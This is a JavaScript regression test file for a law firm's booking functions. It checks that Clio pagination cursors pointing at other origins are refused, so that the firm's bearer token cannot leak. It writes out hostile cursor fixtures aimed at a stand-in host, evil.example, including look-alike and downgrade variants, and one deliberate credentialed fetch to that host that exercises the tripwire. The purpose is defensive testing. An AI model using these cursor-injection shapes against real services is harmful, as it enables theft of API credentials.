// ── ORDER SHELDON-BOOKING-ORIGIN ─────────────────────────────────────────────
//
// THE PAGINATION WALK 133 ADDED HANDS THE FIRM'S CLIO TOKEN TO WHOEVER NAMES THE
// NEXT PAGE. fetchBusyBlocks read `meta.paging.next` out of the RESPONSE BODY,
// tested it with `typeof next === "string" && next !== ""`, and assigned it to the
// loop URL. clioFetch attaches `Authorization: Bearer <the firm's Clio access
// token>` to any absolute URL it is handed, so a body carrying
//
//   { "data":[…200 entries…], "meta":{"paging":{"next":"https://evil.example/x"}} }
//
// sent the live token to evil.example — up to nine times per availability read
// (CALENDAR_MAX_PAGES − 1, each page free to name the next), from /booking/
// availability, which is PUBLIC and unauthenticated, and with nothing in the log to
// say it happened. A non-empty string is not a claim about where the string points.
//
// clio-custom-fields.js carried the identical walk. Its `api.get` passes anything
// starting with "http" straight through to the same clioFetch.
//
// Same class as the headline finding on adam/clio-scope-verifier-r2 at c820cee.
//
// ── WHAT THIS FILE PROVES ────────────────────────────────────────────────────
//   • THE EGRESS TRIPWIRE. Every stub here records the host and the presence of an
//     Authorization header on EVERY request a booking issues, and any credentialed
//     request to a host that is not Clio fails the test by name. This is the
//     assertion the ticket is actually about; a status code is not.
//   • THE TRIPWIRE IS NOT INERT — it is fired deliberately once, and the tests that
//     rely on it assert that off-host traffic DID occur (Turnstile siteverify) so
//     "no credentialed egress" cannot be passing because nothing left the origin.
//   • THE CONTROL — an off-host `next` on the calendar walk is refused: zero
//     credentialed egress, zero writes, 502 at /booking/create and 500 at
//     /booking/availability. Revert the origin check in clio-paging.js and the
//     egress assertion fails, because the off-host page answers a well-formed empty
//     last page and the booking otherwise completes 201 with the token already gone.
//   • THE SAME CONTROL ON THE SECOND WALK — an off-host `next` on GET /custom_fields
//     is refused, degrades to "no intake fields" exactly as every other failure in
//     that module does, and does not fail the booking.
//   • THE NARROWING, which is the whole reason this is not just "refuse paging": a
//     SAME-HOST next cursor still walks, and the busy block on PAGE TWO still takes
//     the slot (409 SLOT_TAKEN). 133's proof of walk, restated against the fix.
//   • THE SHAPES REFUSED — an http:// downgrade of the right hostname, a look-alike
//     host that a `startsWith`/`includes` check would wave through, a relative
//     cursor, a non-string one.
//   • THE HOST IS NAMED IN THE LOG AND THE CURSOR IS NOT — the refusal is alertable
//     without the walk echoing a URL that carries the firm's calendar id and window.
//
// ── WHAT IT CANNOT PROVE — no assertion below claims it ──────────────────────
//   • that Clio has ever been compromised, or that any body has ever carried a
//     hostile cursor. These are the shapes the failure arrives in, stubbed.
//   • that `meta.paging.next` is contractual, or that it is absolute. It is in
//     NEITHER: integrations/clio/openapi.v4.json documents no `meta`, no `paging` and
//     no `next` key at all. Absolute is what the 2026-07-03 sandbox probe observed
//     and what project-handoff/03-research/clio-integration-research.md §4.1 records
//     ("`meta.paging.next` and `meta.paging.previous` URLs in response body"). The
//     relative-cursor test below asserts the REFUSAL that assumption implies, so if
//     Clio is ever seen sending a relative cursor this file is what fails first.
//   • that the token itself is well-formed or accepted. The tripwire tests for the
//     PRESENCE of an Authorization header, which is the whole harm — a bearer token
//     on the wire to a host that should never see one.

import { test, describe, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { onRequestPost as bookingCreate } from '../donovan-legal-site/functions/booking/create.js';
import { onRequestGet as bookingAvailability } from '../donovan-legal-site/functions/booking/availability.js';
import { __resetIntakeFieldCache } from '../donovan-legal-site/functions/booking/_lib/clio-custom-fields.js';
import { nextPageUrl, CLIO_BASE, CLIO_ORIGIN } from '../donovan-legal-site/functions/booking/_lib/clio-paging.js';
import { stubFetch, muteConsole, makeKV, makeDurableObject } from './helpers/stubs.mjs';

const SITEVERIFY     = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
const CLIO_TOKEN     = 'https://app.clio.com/oauth/token';
const CLIO_ENTRIES   = 'https://app.clio.com/api/v4/calendar_entries';
const CLIO_CONTACTS  = 'https://app.clio.com/api/v4/contacts';
const CLIO_CFIELDS   = 'https://app.clio.com/api/v4/custom_fields';
const CLIO_NOTES     = 'https://app.clio.com/api/v4/notes';
const GROW_INBOX     = 'https://grow.clio.com/inbox_leads';
const VANTAGE_UPSERT = 'https://vantage.ticoai.net/upsert-lead';

/** The page size provider-clio.js asks for — the contract's documented maximum. */
const PAGE_LIMIT = 200;

/**
 * The attacker's host, and the query it would like echoed into our logs.
 *
 * `secret=leaked` is not decoration: the refusal names a HOST and must not name the
 * cursor, because a real cursor echoes the query it pages and on the calendar walk
 * that query carries the firm's calendar id and the window it was read over.
 */
const EVIL_HOST = 'evil.example';
const EVIL_NEXT = `https://${EVIL_HOST}/api/v4/calendar_entries?page_token=pwned&secret=leaked`;

/**
 * A host that CONTAINS the Clio origin as a prefix, and is not it.
 *
 * The shape a `startsWith("https://app.clio.com")` check waves through — and the
 * reason the helper parses and compares an ORIGIN rather than matching a string.
 */
const LOOKALIKE_NEXT = 'https://app.clio.com.evil.example/api/v4/calendar_entries?page_token=p1';

/** The right hostname over cleartext. An origin comparison refuses it; a host one does not. */
const DOWNGRADE_NEXT = 'http://app.clio.com/api/v4/calendar_entries?page_token=p1';

let _cidSeq = 0;
const freshClientId = () => `origin-cid-${(_cidSeq += 1)}`;

function env(over = {}) {
  return {
    TURNSTILE_SECRET_KEY: 'test-secret',
    CLIO_CLIENT_ID: 'cid',
    CLIO_CLIENT_SECRET: 'csec',
    CLIO_REFRESH_TOKEN: 'rtok',
    CLIO_CALENDAR_ID: 9084638,
    CLIO_CREATE_CONTACT: '1',
    ...over,
  };
}

/** A weekday slot inside the firm's 9–17 ET window, a week out. */
function futureMondaySlot() {
  const d = new Date(Date.now() + 7 * 86400_000);
  d.setUTCHours(14, 0, 0, 0);
  while (d.getUTCDay() !== 1) d.setUTCDate(d.getUTCDate() + 1);
  return d.toISOString();
}
const SLOT = futureMondaySlot();
const SLOT_MS = Date.parse(SLOT);

const entryAt = (startMs, mins = 30) => ({
  start_at: new Date(startMs).toISOString(),
  end_at:   new Date(startMs + mins * 60_000).toISOString(),
});

/** The entry Clio returns when the attorney really is booked at SLOT. */
const BUSY_AT_SLOT = entryAt(SLOT_MS);

/** `n` entries that are NOT at SLOT, so nothing here can take the slot by accident. */
const filler = (n) => Array.from({ length: n }, (_, i) => entryAt(SLOT_MS - 14 * 86400_000 + i * 3600_000));

/** The firm's own next-page URL, for the walk that is supposed to keep working. */
const sameHostNext = (n) => `${CLIO_ENTRIES}?page_token=p${n}`;

/**
 * One page of a calendar list.
 *
 * `next` is either an INDEX into the `pages` array (a same-host cursor this stub
 * will serve) or a literal string — which is how a hostile cursor is spelled as the
 * exact bytes Clio would have put on the wire.
 */
function pageBody(entries, next) {
  const body = { data: entries };
  if (typeof next === 'number') body.meta = { paging: { next: sameHostNext(next) } };
  else if (next !== undefined) body.meta = { paging: { next } };
  return JSON.stringify(body);
}

/** The intake answers, so the /custom_fields walk is genuinely exercised. */
const CALL_ID = 'call-origin-0001';
const INTAKE = {
  matter_category: 'Real estate',
  matter_sub:      'Acquisition',
  for_whom:        'Yourself (personal)',
  income_band:     '$1.5M–$3M',
  net_worth_band:  '$5M–$15M',
  language:        'English',
  source:          'Referred by a client',
};

function kvWithQualifier() {
  return makeKV({
    [`qualbk:${CALL_ID}`]: JSON.stringify({
      summary: '— Perch intake —\nMatter: Real estate', intake: INTAKE, state: 'FL', matter: 'real_estate',
    }),
  });
}
function bridgeWithQualifier() {
  const ns = makeDurableObject();
  ns.instance('donovan').state.set(`qual:${CALL_ID}`, { status: 'complete' });
  return ns;
}

/**
 * Read an Authorization header off whatever shape the caller built.
 *
 * clioFetch builds a plain object today. Reading Headers and entry-array forms too
 * costs three lines and stops this tripwire from going quietly blind if that ever
 * changes — a detector that silently stops detecting is worse than no detector.
 */
function authOf(init) {
  const h = init?.headers;
  if (!h) return '';
  if (typeof h.get === 'function') return h.get('authorization') ?? '';
  if (Array.isArray(h)) {
    const row = h.find(([k]) => String(k).toLowerCase() === 'authorization');
    return row ? String(row[1]) : '';
  }
  const key = Object.keys(h).find((k) => k.toLowerCase() === 'authorization');
  return key ? String(h[key]) : '';
}

/**
 * Stub every edge a booking touches, WITH AN EGRESS TRIPWIRE IN FRONT OF IT.
 *
 * Every request — stubbed or not — is recorded as { host, method, credentialed }
 * BEFORE it is dispatched, and any credentialed request whose origin is not Clio's
 * lands in `seen.credentialedEgress`. That list is the assertion this whole file
 * exists for.
 *
 * THE OFF-HOST HANDLER ANSWERS PLAUSIBLY RATHER THAN THROWING, deliberately. A stub
 * that threw on an unknown host would turn a leak into a rejected promise, which
 * fetchBusyBlocks would surface as the same 502 a REFUSAL produces — so a test
 * asserting only on the status would pass identically whether the token had been
 * sent or not. Answering `{"data":[]}` means that with the origin check reverted the
 * walk COMPLETES and the booking returns 201 with the token already on the wire, and
 * the only thing that notices is `credentialedEgress`. That is the discrimination.
 */
function stubAll({
  pages = [pageBody([])],
  cfPages = [JSON.stringify({ data: [] })],
  contactSearchBody = '{"data":[]}',
} = {}) {
  const seen = {
    requests: [], credentialedEgress: [], offHost: [],
    reads: [], readUrls: [], cfReads: [],
    entryPosts: [], contactPosts: [], patches: [], notes: [], tokens: [],
  };

  const handle = stubFetch(async (url, init) => {
    const u = String(url);
    const method = init?.method ?? 'GET';
    const credentialed = authOf(init) !== '';
    let origin = '', host = '';
    try { const p = new URL(u); origin = p.origin; host = p.host; } catch (_) { /* recorded as blank */ }

    seen.requests.push({ url: u, host, method, credentialed });
    if (origin !== CLIO_ORIGIN) {
      seen.offHost.push({ host, method, credentialed });
      // THE TRIPWIRE. Recorded, never thrown — see the header.
      if (credentialed) seen.credentialedEgress.push({ host, method, url: u });
    }

    if (u === SITEVERIFY) return new Response(JSON.stringify({ success: true }));

    if (u.startsWith(CLIO_TOKEN)) {
      seen.tokens.push(u);
      return new Response(JSON.stringify({ access_token: `at-${seen.tokens.length}` }));
    }

    if (u.startsWith(CLIO_ENTRIES) && method === 'GET') {
      const token = new URL(u).searchParams.get('page_token');
      const idx = token ? Number(token.slice(1)) : 0;
      seen.reads.push(idx);
      seen.readUrls.push(u);
      return new Response(pages[idx] ?? pageBody([]), { status: 200 });
    }
    if (u.startsWith(CLIO_ENTRIES) && method === 'POST') {
      seen.entryPosts.push(JSON.parse(init.body));
      return new Response(JSON.stringify({ data: { id: 999999 } }), { status: 201 });
    }

    if (u.startsWith(CLIO_CFIELDS) && method === 'GET') {
      const token = new URL(u).searchParams.get('page_token');
      const idx = token ? Number(token.slice(1)) : 0;
      seen.cfReads.push(idx);
      return new Response(cfPages[idx] ?? JSON.stringify({ data: [] }));
    }

    if (u.startsWith(`${CLIO_CONTACTS}/`) && method === 'PATCH') {
      seen.patches.push(JSON.parse(init.body));
      return new Response(JSON.stringify({ data: { id: 4242 } }));
    }
    if (u.startsWith(CLIO_CONTACTS) && method === 'GET') return new Response(contactSearchBody);
    if (u.startsWith(CLIO_CONTACTS) && method === 'POST') {
      seen.contactPosts.push(JSON.parse(init.body));
      return new Response(JSON.stringify({ data: { id: 4242 } }));
    }
    if (u.startsWith(CLIO_NOTES) && method === 'POST') {
      seen.notes.push(JSON.parse(init.body));
      return new Response(JSON.stringify({ data: { id: 77 } }));
    }

    if (u.startsWith(GROW_INBOX)) return new Response(JSON.stringify({ ok: true }));
    if (u.startsWith(VANTAGE_UPSERT)) return new Response(JSON.stringify({ ok: true }));

    // Anywhere else — INCLUDING the attacker's host. A well-formed, complete, empty
    // last page, so a reverted origin check produces a SUCCESSFUL booking and the
    // tripwire is the only thing that can tell.
    return new Response(JSON.stringify({ data: [] }), { status: 200 });
  });

  return { seen, restore: () => handle.restore() };
}

/**
 * The assertion the ticket is about, plus the arms that stop it being vacuous.
 *
 * "No credentialed request left the origin" is trivially true of a run that issued
 * no credentialed requests, and equally true of one that issued no requests at all.
 * Both arms are therefore asserted rather than assumed:
 *
 *   · A CREDENTIALED REQUEST HAPPENED. The token path ran; there was a token to
 *     leak. This holds on every path here, including /booking/availability.
 *   · OFF-HOST TRAFFIC HAPPENED. Something DID leave the Clio origin — just nothing
 *     carrying a bearer token. On /booking/create that is Turnstile siteverify.
 *     /booking/availability talks to nobody but Clio, so it passes
 *     `expectOffHost: false` rather than asserting a thing that is not true of it.
 */
function assertNoCredentialedEgress(seen, { expectOffHost = true } = {}) {
  assert.ok(
    seen.requests.some((r) => r.credentialed),
    'a credentialed request WAS issued — there was a token on this path to leak',
  );
  if (expectOffHost) {
    assert.ok(seen.offHost.length > 0, 'off-host traffic DID occur — the tripwire had something to see');
  }
  assert.deepEqual(
    seen.credentialedEgress, [],
    `a bearer-credentialed request left the Clio origin: ${JSON.stringify(seen.credentialedEgress)}`,
  );
}

let _ipSeq = 0;
const nextIp = () => `198.51.100.${(_ipSeq += 1) % 250}`;

function post(over = {}) {
  return new Request('https://www.donovan.law/booking/create', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'CF-Connecting-IP': nextIp() },
    body: JSON.stringify({
      type: 'consult',
      slot: SLOT,
      name: 'Jane Q Caller',
      email: 'jane.caller@example.com',
      phone: '(561) 555-0142',
      turnstile_token: 'good-token',
      ...over,
    }),
  });
}

async function book(envOver = {}, bodyOver = {}) {
  return bookingCreate({
    request: post(bodyOver),
    env: env({ PERCH_ACTIONS: makeKV(), PERCH_BRIDGE: makeDurableObject(), ...envOver }),
  });
}

/** A booking that carries a verified qualifier, so the /custom_fields walk runs. */
async function bookWithIntake(envOver = {}) {
  return bookingCreate({
    request: post({ call_id: CALL_ID }),
    env: env({ PERCH_ACTIONS: kvWithQualifier(), PERCH_BRIDGE: bridgeWithQualifier(), ...envOver }),
  });
}

async function readAvailability(envOver = {}) {
  return bookingAvailability({
    request: new Request('https://www.donovan.law/booking/availability?type=consult&days=60'),
    env: env(envOver),
  });
}

let stub, mute;
beforeEach(() => { __resetIntakeFieldCache(); mute = muteConsole(); });
afterEach(() => { stub?.restore(); mute.restore(); });

// ─────────────────────────────────────────────────────────────────────────────
// 0. The tripwire itself, before anything is asserted with it
// ─────────────────────────────────────────────────────────────────────────────
describe('the credentialed-egress tripwire actually detects', () => {
  test('THE POSITIVE ARM: a credentialed off-host request IS recorded', async () => {
    // Fired by hand. Without this, every "no credentialed egress" assertion below
    // would be equally satisfied by a detector that records nothing at all — which
    // is exactly the failure mode a tripwire has.
    stub = stubAll();
    await globalThis.fetch(`https://${EVIL_HOST}/x`, {
      headers: { Authorization: 'Bearer would-be-the-firms-token' },
    });

    assert.equal(stub.seen.credentialedEgress.length, 1, 'the tripwire sees a token leaving');
    assert.equal(stub.seen.credentialedEgress[0].host, EVIL_HOST);
  });

  test('…and an UNcredentialed off-host request is not, so the signal is the token', async () => {
    stub = stubAll();
    await globalThis.fetch(`https://${EVIL_HOST}/x`);

    assert.deepEqual(stub.seen.credentialedEgress, [], 'off-host alone is not the harm');
    assert.equal(stub.seen.offHost.length, 1, 'but it was still seen');
  });

  test('…and a credentialed request to Clio itself is not flagged', async () => {
    // The floor. A tripwire that flagged the ordinary calendar read would make every
    // assertion in this file unfalsifiable in the other direction.
    stub = stubAll();
    await book();

    assertNoCredentialedEgress(stub.seen);
    assert.ok(
      stub.seen.requests.some((r) => r.host === 'app.clio.com' && r.credentialed),
      'the ordinary Clio traffic IS credentialed — the tripwire is scoped to the host, not to the header',
    );
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 1. TASK 1 — the calendar walk refuses an off-host cursor
// ─────────────────────────────────────────────────────────────────────────────
describe('an off-host next cursor on the calendar walk is refused', () => {
  test('THE CONTROL: no bearer-credentialed request leaves the Clio origin', async () => {
    // Revert the origin check in clio-paging.js and THIS is the assertion that
    // fails: page one is full and names evil.example, the off-host handler answers a
    // clean empty last page, the walk completes and the booking returns 201 — with
    // `Authorization: Bearer <the firm's Clio token>` already delivered to a host
    // that should never have seen one. The status tells you nothing; this does.
    stub = stubAll({ pages: [pageBody(filler(PAGE_LIMIT), EVIL_NEXT)] });
    const res = await book();

    assertNoCredentialedEgress(stub.seen);
    assert.equal(
      stub.seen.requests.some((r) => r.host === EVIL_HOST), false,
      'the attacker host was not contacted at all, credentialed or otherwise',
    );
    assert.equal(res.status, 502, 'and the walk fails closed, as every other unfinished walk does');
    assert.equal((await res.json()).code, 'PROVIDER_ERROR');
  });

  test('…and nothing is written onto a calendar we refused to finish reading', async () => {
    // The 129/133 direction, restated. A refused walk may not become a booking.
    stub = stubAll({ pages: [pageBody(filler(PAGE_LIMIT), EVIL_NEXT)] });
    await book();

    assert.deepEqual(stub.seen.entryPosts, [], 'no calendar entry');
    assert.deepEqual(stub.seen.reads, [0], 'the walk stopped on the first page, having read it');
  });

  test('the refusal names the rejected HOST, and never the cursor', async () => {
    stub = stubAll({ pages: [pageBody(filler(PAGE_LIMIT), EVIL_NEXT)] });
    await book();

    assert.ok(mute.saw('refused a next page cursor'), 'greppable, and in its own words');
    assert.ok(mute.saw(`refused host ${EVIL_HOST}`), 'the host an operator has to alert on is named');
    assert.equal(mute.saw('secret=leaked'), false, 'the cursor query is NOT echoed into our stream');
    assert.equal(mute.saw('page_token=pwned'), false);
    // Distinct from every other refusal on this path, or an operator cannot tell a
    // credential leak from a truncated page.
    assert.equal(mute.saw('full page with no next page'), false);
    assert.equal(mute.saw('no entry array'), false);
    assert.equal(mute.saw('unreadable body'), false);
    assert.equal(mute.saw('calendar entries read:'), false, 'and NOT the line that means the calendar answered');
  });

  test('THE AMPLIFIER: /booking/availability refuses too — it is public and unauthenticated', async () => {
    // The surface that makes this worth a ticket rather than a note. Anyone can call
    // the availability endpoint, so on main the request rate for the leak was the
    // attacker's to choose, nine cursors deep per call.
    stub = stubAll({ pages: [pageBody(filler(PAGE_LIMIT), EVIL_NEXT)] });
    const res = await readAvailability();

    // No Turnstile on this route — it talks to Clio and nobody else, so the
    // off-host arm would be asserting something untrue of it.
    assertNoCredentialedEgress(stub.seen, { expectOffHost: false });
    assert.equal(res.status, 500);
    const body = await res.json();
    assert.equal(body.code, 'PROVIDER_ERROR');
    assert.equal('slots' in body, false, 'no slot list at all, empty or otherwise');
  });

  test('a hostile cursor on a LATER page is refused as well as one on the first', async () => {
    // A check that ran once on page one and trusted the rest would leave eight
    // credentialed requests available to anything that can influence page two.
    stub = stubAll({
      pages: [
        pageBody(filler(PAGE_LIMIT), 1),
        pageBody(filler(PAGE_LIMIT), EVIL_NEXT),
      ],
    });
    const res = await book();

    assertNoCredentialedEgress(stub.seen);
    assert.deepEqual(stub.seen.reads, [0, 1], 'both legitimate pages were read');
    assert.equal(res.status, 502);
    assert.deepEqual(stub.seen.entryPosts, []);
  });

  test('a LOOK-ALIKE host is refused — the test is an origin, not a prefix', async () => {
    // `https://app.clio.com.evil.example/…` starts with the Clio origin as a string
    // and is a different site. This is the shape a `startsWith` or `includes` check
    // hands the token to.
    stub = stubAll({ pages: [pageBody(filler(PAGE_LIMIT), LOOKALIKE_NEXT)] });
    const res = await book();

    assertNoCredentialedEgress(stub.seen);
    assert.equal(res.status, 502);
    assert.ok(mute.saw('refused host app.clio.com.evil.example'));
  });

  test('an http:// downgrade of the RIGHT hostname is refused', async () => {
    // Origin, not host: cleartext to app.clio.com puts the same bearer token on the
    // wire for anything between here and there, and a host comparison waves it past.
    stub = stubAll({ pages: [pageBody(filler(PAGE_LIMIT), DOWNGRADE_NEXT)] });
    const res = await book();

    assert.equal(res.status, 502);
    assert.ok(mute.saw('off-origin next page cursor'));
    assert.equal(
      stub.seen.requests.some((r) => r.url.startsWith('http://')), false,
      'no cleartext request was issued',
    );
  });

  test('a RELATIVE cursor is refused — the assumed shape is absolute, and it is stated', async () => {
    // integrations/clio/openapi.v4.json documents neither `meta` nor `paging` nor
    // `next`, so "absolute" is an OBSERVATION (the 2026-07-03 sandbox probe, and
    // clio-integration-research.md §4.1 calling them URLs), not a contract. Refusing
    // a relative cursor is the fail-closed reading of that. If Clio is ever seen
    // sending one, this is the assertion that fails first and the resolving arm
    // belongs in clio-paging.js, once — not loosened at a call site.
    stub = stubAll({ pages: [pageBody(filler(PAGE_LIMIT), '/api/v4/calendar_entries?page_token=p1')] });
    const res = await book();

    assert.equal(res.status, 502);
    assert.ok(mute.saw('not an absolute URL'), 'and it says which assumption it is enforcing');
    assert.deepEqual(stub.seen.reads, [0]);
  });

  test('a non-string cursor is refused rather than coerced', async () => {
    stub = stubAll({
      pages: [JSON.stringify({ data: filler(PAGE_LIMIT), meta: { paging: { next: { url: EVIL_NEXT } } } })],
    });
    const res = await book();

    assertNoCredentialedEgress(stub.seen);
    assert.equal(res.status, 502);
    assert.ok(mute.saw('non-string next page cursor'));
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 2. TASK 4 — the fix did not neuter 133
// ─────────────────────────────────────────────────────────────────────────────
describe('a same-host next cursor still walks', () => {
  test('THE PROOF OF WALK: the busy block on PAGE TWO still takes the slot', async () => {
    // 133's central assertion, restated against the origin check. If the check were
    // written as "refuse paging" — or as anything a legitimate Clio cursor trips —
    // page two would never be read, the slot would look free, and this would be a
    // 201 onto an hour Paul is already sitting in.
    stub = stubAll({
      pages: [
        pageBody(filler(PAGE_LIMIT), 1),   // full, and says there is more
        pageBody([BUSY_AT_SLOT]),          // the entry Paul is actually sitting in
      ],
    });
    const res = await book();

    assert.equal(res.status, 409);
    assert.equal((await res.json()).code, 'SLOT_TAKEN');
    assert.deepEqual(stub.seen.reads, [0, 1], 'both pages were read, in order');
    assert.deepEqual(stub.seen.entryPosts, [], 'the slot Paul is sitting in is not written over');
    assertNoCredentialedEgress(stub.seen);
  });

  test('…and a walk whose later pages are clear still books, through the same check', async () => {
    stub = stubAll({
      pages: [
        pageBody(filler(PAGE_LIMIT), 1),
        pageBody(filler(3)),               // short ⇒ genuinely the last page
      ],
    });
    const res = await book();

    assert.equal(res.status, 201, 'paging is not a new way of refusing');
    assert.equal(stub.seen.entryPosts.length, 1);
    assert.deepEqual(stub.seen.reads, [0, 1]);
    assert.ok(mute.saw('calendar entries read: 203 (pages: 2)'), 'both pages counted');
  });

  test('a genuine single short page still books, in ONE request', async () => {
    stub = stubAll({ pages: [pageBody(filler(5))] });
    const res = await book();

    assert.equal(res.status, 201);
    assert.equal(stub.seen.reads.length, 1, 'no extra round trip on the common path');
    assert.equal(mute.saw('refused a next page cursor'), false, 'an absent cursor is not a refusal');
  });

  test('the full-page backstop still fires — the origin check did not replace it', async () => {
    // 133's control. A FULL page with NO next page is still not an answer, and the
    // new refusal must not have absorbed it: they are different facts and they get
    // told apart in the log or neither is diagnosable.
    stub = stubAll({ pages: [pageBody(filler(PAGE_LIMIT))] });
    const res = await book();

    assert.equal(res.status, 502);
    assert.ok(mute.saw('full page with no next page'));
    assert.equal(mute.saw('refused a next page cursor'), false, 'not conflated with the origin refusal');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 3. TASK 2 — the second walk, in clio-custom-fields.js
// ─────────────────────────────────────────────────────────────────────────────
describe('an off-host next cursor on the custom-field walk is refused', () => {
  test('THE CONTROL: no bearer-credentialed request leaves the Clio origin', async () => {
    // The identical walk. `api.get` in provider-clio.js passes anything starting
    // with "http" straight to clioFetch, so an off-host cursor here is the same
    // token handout — bounded by MAX_PAGES rather than by anything about the host.
    stub = stubAll({
      cfPages: [JSON.stringify({ data: [], meta: { paging: { next: EVIL_NEXT } } })],
    });
    const res = await bookWithIntake();

    assertNoCredentialedEgress(stub.seen);
    assert.equal(
      stub.seen.requests.some((r) => r.host === EVIL_HOST), false,
      'the attacker host was not contacted',
    );
    assert.equal(stub.seen.cfReads.length, 1, 'the walk stopped at the page it had');
    assert.ok(mute.saw(`refused host ${EVIL_HOST}`), 'and named the host');
  });

  test('…and it degrades to "no intake fields" rather than failing the booking', async () => {
    // This module's own contract, in its header: nothing here may fail a booking.
    // A refused cursor is an incomplete enumeration like any other, so it returns a
    // FAILED list — the contact simply carries no custom_field_values, and the same
    // answers stay legible on the intake Note.
    stub = stubAll({
      cfPages: [JSON.stringify({ data: [], meta: { paging: { next: EVIL_NEXT } } })],
    });
    const res = await bookWithIntake();

    assert.equal(res.status, 201, 'the appointment is the product; a CRM field is not');
    assert.equal(stub.seen.entryPosts.length, 1);
    assert.ok(mute.saw('custom field list failed'), 'reported as a failed list');
    assert.ok(stub.seen.notes.length > 0, 'and the intake note still carries the answers');
  });

  test('THE NARROWING: a same-host custom-field cursor still walks both pages', async () => {
    // The mirror. Without this the refusal above would also be satisfied by a build
    // that stopped following custom-field pages at all.
    stub = stubAll({
      cfPages: [
        JSON.stringify({ data: [], meta: { paging: { next: `${CLIO_CFIELDS}?page_token=p1` } } }),
        JSON.stringify({ data: [] }),
      ],
    });
    const res = await bookWithIntake();

    assert.deepEqual(stub.seen.cfReads, [0, 1], 'both pages were read, in order');
    assert.equal(res.status, 201);
    assert.equal(mute.saw('refused a next page cursor'), false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 4. The helper itself — one admission point, exercised directly
// ─────────────────────────────────────────────────────────────────────────────
describe('nextPageUrl is the only place a cursor is admitted', () => {
  test('an absent cursor is "no next page", not a refusal', () => {
    for (const raw of [undefined, null, '']) {
      assert.equal(nextPageUrl(raw, 'GET /x'), '', `absent cursor: ${String(raw)}`);
    }
  });

  test('a cursor on the Clio origin is returned', () => {
    const url = `${CLIO_BASE}/calendar_entries?page_token=p1`;
    assert.equal(nextPageUrl(url, 'GET /x'), url);
    assert.equal(CLIO_ORIGIN, 'https://app.clio.com', 'the origin is derived from CLIO_BASE, not spelled twice');
  });

  test('every off-origin shape throws, naming the host where there is one', () => {
    for (const [raw, needle] of [
      [EVIL_NEXT, `refused host ${EVIL_HOST}`],
      [LOOKALIKE_NEXT, 'refused host app.clio.com.evil.example'],
      [DOWNGRADE_NEXT, 'refused host app.clio.com'],
      ['https://app.clio.com:8443/api/v4/x', 'refused host app.clio.com:8443'],
    ]) {
      assert.throws(() => nextPageUrl(raw, 'GET /x'), (e) => e.message.includes(needle), `refused: ${raw}`);
    }
  });

  test('a cursor carrying URL credentials is refused even on the right origin', () => {
    assert.throws(
      () => nextPageUrl('https://user:pw@app.clio.com/api/v4/x', 'GET /x'),
      /carrying credentials/,
    );
  });

  test('the `where` label reaches the message, so two walks are told apart', () => {
    assert.throws(() => nextPageUrl(EVIL_NEXT, 'GET /calendar_entries'), /GET \/calendar_entries/);
    assert.throws(() => nextPageUrl(EVIL_NEXT, 'GET /custom_fields'), /GET \/custom_fields/);
  });
});
